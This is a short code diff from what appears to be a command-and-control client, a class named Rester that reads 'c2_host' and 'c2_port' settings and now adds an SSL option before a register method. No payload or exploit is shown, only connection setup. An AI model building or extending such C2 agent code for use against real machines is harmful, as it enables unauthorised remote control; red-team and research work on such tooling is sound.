@@ -6,10 +6,12 @@ from .settings import *
 from .lib.decorators import Request
 from .db.SQLite import Helper
 
+
 class Rester():
     def __init__(self):
         self.db = Helper()
-        self.fetch = Request(self.db.get_config('c2_host'), port=int(self.db.get_config('c2_port')))
+        self.fetch = Request(self.db.get_config('c2_host'), port=int(self.db.get_config('c2_port')),
+                             ssl=self.db.get_config('ssl'))
 
     def register(self):
         data = {
